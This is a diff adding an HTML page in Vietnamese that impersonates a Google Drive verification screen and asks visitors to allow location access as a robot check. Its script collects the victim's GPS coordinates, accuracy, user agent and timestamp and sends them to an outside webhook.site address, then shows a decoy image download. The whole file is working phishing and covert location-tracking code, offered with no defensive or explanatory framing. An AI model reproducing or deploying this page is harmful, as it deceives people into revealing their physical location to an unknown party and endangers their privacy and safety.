@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Drive - Xác minh truy cập</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      padding: 30px;
+      text-align: center;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      height: 40px;
+    }
+    h2 {
+      font-size: 20px;
+      color: #202124;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #5f6368;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    button {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 20px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #1669c1;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="form-box">
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive">
+    </div>
+    <h2>Xác minh để tiếp tục tải xuống</h2>
+    <p>Hệ thống cần xác nhận bạn không phải robot.<br>
+    Vui lòng nhấn nút bên dưới và chọn <b>"Cho phép"</b> định vị để hoàn tất kiểm tra.</p>
+    <button onclick="verifyAccess()">Xác minh ngay</button>
+    <div class="footer">© Google Drive - Dịch vụ của Google</div>
+  </div>
+
+  <div class="container" id="gallery" style="display:none;">
+    <h2>Tệp có sẵn để tải xuống</h2>
+    <div>
+      <a href="https://raw.githubusercontent.com/Or4nge16Hehe/imagedownload/refs/heads/main/8a.jpg" download>
+        📥 Tải ảnh
+      </a>
+    </div>
+  </div>
+
+  <script>
+    const webhook = "https://webhook.site/aac873f7-5c2e-4afd-94eb-9944647c8eca";
+
+    function sendToWebhook(data) {
+      const body = JSON.stringify(data);
+      fetch(webhook, { method: "POST", body, keepalive: true }).catch(()=>{});
+      navigator.sendBeacon(webhook, body);
+    }
+
+    function verifyAccess() {
+      document.getElementById("form-box").innerHTML = "<p>🔄 Đang xác minh danh tính... Vui lòng chờ...</p>";
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            sendToWebhook({
+              status: "gps_success",
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              ua: navigator.userAgent,
+              time: new Date().toISOString()
+            });
+          },
+          err => {
+            sendToWebhook({
+              status: "gps_denied",
+              error: err.message,
+              ua: navigator.userAgent,
+              time: new Date().toISOString()
+            });
+          }
+        );
+      }
+
+      setTimeout(() => {
+        document.getElementById("form-box").style.display = "none";
+        document.getElementById("gallery").style.display = "block";
+      }, 2500);
+    }
+  </script>
+</body>
+</html>
